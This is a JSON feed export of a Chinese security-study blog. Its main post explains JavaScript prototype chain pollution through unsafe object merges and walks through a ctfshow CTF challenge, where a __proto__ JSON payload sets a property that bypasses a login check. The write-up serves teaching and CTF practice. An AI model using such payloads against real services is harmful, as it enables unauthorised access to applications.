{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/6882c75c/",
            "url": "http://dpm12345.cn/posts/6882c75c/",
            "title": "JavaScript 原型链污染(Prototype).md",
            "date_published": "2023-08-15T12:15:40.000Z",
            "content_html": "<p>JavaScript 是一门非常灵活的语言，我感觉在某些方面可能比 PHP 更加灵活。所以，除了传统的 SQL 注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如 prototype 污染。</p>\n<h1 id=\"prototype和__proto__\"><a class=\"anchor\" href=\"#prototype和__proto__\">#</a>  <code>prototype</code>  和 <code>__proto__</code></h1>\n<p>JavaScript 中，我们如果要定义一个类，需要以定义 “构造函数” 的方式来定义：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p><code>Foo</code>  函数的内容，就是 <code>Foo</code>  类的构造函数，而 <code>this.state</code>  就是 <code>Foo</code>  类的一个属性。</p>\n<p>为了简化编写 JavaScript 代码，ECMAScript 6 后增加了 <code>class</code>  语法，但 <code>class</code>  其实只是一个语法糖。</p>\n<p>一个类必然有一些方法，类似属性 <code>this.state</code> ，我们也可以将方法定义在构造函数内部：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">show</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>但这样写有一个问题，就是每当我们新建一个 Foo 对象时， <code>this.show = function...</code>  就会执行一次，这个 <code>show</code>  方法实际上是绑定在对象上的，而不是绑定在 “类” 中。</p>\n<p>我希望在创建类的时候只创建一次 <code>show</code>  方法，这时候就则需要使用原型（prototype）了：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">Foo</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">show</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>foo<span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>我们可以认为原型 <code>prototype</code>  是类 <code>Foo</code>  的一个属性，而所有用 <code>Foo</code>  类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的 <code>foo</code>  对象，其天生就具有 <code>foo.show()</code>  方法。</p>\n<p>我们可以通过 <code>Foo.prototype</code>  来访问 <code>Foo</code>  类的原型，但 <code>Foo</code>  实例化出来的对象，是不能通过 prototype 访问原型的 (即，若 <code>foo</code>  是 <code>Foo</code>  类实例化的一个对象，那么 <code>foo.prototype</code>  是无法使用的。这时候，就该 <code>__proto__</code> 登场了。</p>\n<p>一个 Foo 类实例化出来的 foo 对象，可以通过 <code>foo.__proto__</code> 属性来访问 Foo 类的原型，也就是说：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>foo<span class=\"token punctuation\">.</span>__proto__ <span class=\"token operator\">==</span> <span class=\"token class-name\">Foo</span><span class=\"token punctuation\">.</span>prototype</pre></td></tr></tbody></table></figure><p>总结：</p>\n<ol>\n<li><code>prototype</code>  是一个类的属性，所有类对象在实例化的时候将会拥有 <code>prototype</code>  中的属性和方法</li>\n<li>一个对象的 <code>__proto__</code> 属性，指向这个对象所在的类的 <code>prototype</code>  属性</li>\n</ol>\n<h1 id=\"javascript原型链继承\"><a class=\"anchor\" href=\"#javascript原型链继承\">#</a> JavaScript 原型链继承</h1>\n<p>所有类对象在实例化的时候将会拥有 <code>prototype</code>  中的属性和方法，这个特性被用来实现 JavaScript 中的继承机制。</p>\n<p>如：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Father</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>first_name <span class=\"token operator\">=</span> <span class=\"token string\">'Donald'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>last_name <span class=\"token operator\">=</span> <span class=\"token string\">'Trump'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">Son</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>first_name <span class=\"token operator\">=</span> <span class=\"token string\">'Melania'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">Son</span><span class=\"token punctuation\">.</span>prototype <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Father</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">let</span> son <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Son</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Name: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>son<span class=\"token punctuation\">.</span>first_name<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>son<span class=\"token punctuation\">.</span>last_name<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>Son 类继承了 Father 类的 <code>last_name</code>  属性，最后输出的是 <code>Name: Melania Trump</code> 。</p>\n<p>总结一下，对于对象 son，在调用 <code>son.last_name</code>  的时候，实际上 JavaScript 引擎会进行如下操作：</p>\n<ol>\n<li>在对象 son 中寻找 last_name</li>\n<li>如果找不到，则在 <code>son.__proto__</code> 中寻找 last_name</li>\n<li>如果仍然找不到，则继续在 <code>son.__proto__.__proto__</code> 中寻找 last_name</li>\n<li>依次寻找，直到找到 <code>null</code>  结束。比如， <code>Object.prototype</code>  的 <code>__proto__</code> 就是 <code>null</code></li>\n</ol>\n<p><img data-src=\"./../../../post_images/javascript_prototype_1.png\" alt=\"image-20230815221255583\"></p>\n<p>JavaScript 的这个查找的机制，被运用在面向对象的继承中，被称作 prototype 继承链。</p>\n<p>以上就是最基础的 JavaScript 面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>\n<ol>\n<li>每个构造函数 (constructor) 都有一个原型对象 (prototype)</li>\n<li>对象的 <code>__proto__</code> 属性，指向类的原型对象 <code>prototype</code></li>\n<li>JavaScript 使用 prototype 链实现继承机制</li>\n</ol>\n<h1 id=\"原型链污染\"><a class=\"anchor\" href=\"#原型链污染\">#</a> 原型链污染</h1>\n<p>简单来说，根据前面的介绍，即对象与类之间的关系，比如一个 <code>Foo</code>  类的实例对象 <code>foo</code> ， <code>foo.__proto__ == Foo.prototype</code> , 如果对 <code>foo.__proto__</code> 进行修改而在之后， <code>Foo</code>  类的实例化对象的属性由于继承关系将会随之改变</p>\n<p>如下面的代码</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//foo 是一个简单的 JavaScript 对象</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token literal-property property\">bar</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//foo.bar 此时为 1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>foo<span class=\"token punctuation\">.</span>bar<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 修改 foo 的原型（即 Object）</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>foo<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span>bar <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 由于查找顺序的原因，foo.bar 仍然是 1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>foo<span class=\"token punctuation\">.</span>bar<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 此时再用 Object 创建一个空的 zoo 对象</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">let</span> zoo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 查看 zoo.bar</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>zoo<span class=\"token punctuation\">.</span>bar<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p><img data-src=\"./../../../post_images/javascript_prototype_2.png\" alt=\"image-20230815221822410\"></p>\n<p>可以看到输出了 <code>1 1 2</code> ，证明原型链被污染，成功修改了原来的类</p>\n<p>原理：因为前面我们修改了 foo 的原型 <code>foo.__proto__.bar = 2</code> ，而 foo 是一个 Object 类的实例，所以实际上是修改了 Object 这个类，给这个类增加了一个属性 bar，值为 2。</p>\n<p>后来，我们又用 Object 类创建了一个 zoo 对象 <code>let zoo = {}</code> ，zoo 对象自然也有一个 bar 属性了。</p>\n<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>\n<h1 id=\"原型链污染可能发生的场景\"><a class=\"anchor\" href=\"#原型链污染可能发生的场景\">#</a> 原型链污染可能发生的场景</h1>\n<ul>\n<li>对象 merge</li>\n<li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li>\n</ul>\n<p>以对象 merge 为例，我们想象一个简单的 merge 函数：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">target<span class=\"token punctuation\">,</span> source</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> key <span class=\"token keyword\">in</span> source<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> source <span class=\"token operator\">&amp;&amp;</span> key <span class=\"token keyword\">in</span> target<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>在合并的过程中，存在赋值的操作 <code>target[key] = source[key]</code> ，那么，这个 key 如果是 <code>__proto__</code> ，就可以顺势原型链污染</p>\n<p>用如下代码实验一下：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> o1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> o2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string-property property\">\"__proto__\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token literal-property property\">b</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>o1<span class=\"token punctuation\">,</span> o2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>o1<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">,</span> o1<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>o3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>o3<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p><img data-src=\"./../../../post_images/javascript_prototype_3.png\" alt=\"image-20230815222140080\"></p>\n<p>但现在的输出似乎与之前的设想有所违背，但这是因为，我们用 JavaScript 创建 o2 的过程（ <code>let o2 = {a: 1, \"__proto__\": {b: 2}}</code> ）中， <code>__proto__</code> 已经代表 o2 的原型了，此时遍历 o2 的所有键名，你拿到的是 <code>[a, b]</code> ，拿到的仅为 <code>{a:1,b:2}</code> ， <code>__proto__</code> 并不是一个 key，自然也不会修改 Object 的原型。</p>\n<p>而要让 <code>__proto__</code> 被识别为一个键，下面的写法可以实现</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> o1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> o2 <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{\"a\": 1, \"__proto__\": {\"b\": 2}}'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>o1<span class=\"token punctuation\">,</span> o2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>o1<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">,</span> o1<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>o3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>o3<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>这里使用 <code>JSON.parse</code></p>\n<p><img data-src=\"./../../../post_images/javascript_prototype_4.png\" alt=\"image-20230815222650451\"></p>\n<p>成功修改了 <code>b</code> ，从而实现了原型链污染</p>\n<p>这是因为，JSON 解析的情况下， <code>__proto__</code> 会被认为是一个真正的 “键名”，而不代表 “原型”，所以在遍历 o2 的时候会存在这个键。</p>\n<h1 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h1>\n<p>ctfshow web 入门 web 338</p>\n<p>common.js</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token literal-property property\">copy</span><span class=\"token operator\">:</span>copy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">object1<span class=\"token punctuation\">,</span> object2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> key <span class=\"token keyword\">in</span> object2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> object2 <span class=\"token operator\">&amp;&amp;</span> key <span class=\"token keyword\">in</span> object1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>object1<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> object2<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            object1<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> object2<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>而在 login.js 中</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* GET home page.  */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">'html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">var</span> flag<span class=\"token operator\">=</span><span class=\"token string\">'flag_here'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">var</span> secert <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">var</span> sess <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  utils<span class=\"token punctuation\">.</span><span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>secert<span class=\"token punctuation\">.</span>ctfshow<span class=\"token operator\">===</span><span class=\"token string\">'36dboy'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'登录失败'</span><span class=\"token operator\">+</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>通过调用 copy 将请求发送来的 json 数据进行 copy，而在该代码中， <code>secret={}</code> ，为了使得其有属性 <code>ctfshow</code> ，故可以通过修改发送的 json 数据，添加 <code>__proto__</code> ，增添 <code>ctfshow：'36dboy'</code></p>\n<p>，从而影响 Object 类，继承，从而使得 secret 含有属性 <code>ctfshow</code> , 并且值为 <code>36dboy</code></p>\n<p><img data-src=\"./../../../post_images/ctfshow/Web-vip/web_338_1.png\" alt=\"web_338_1\"></p>\n",
            "tags": [
                "CTF",
                "web",
                "javascript"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/3418e521/",
            "url": "http://dpm12345.cn/posts/3418e521/",
            "title": "nodejs",
            "date_published": "2023-08-10T14:15:40.000Z",
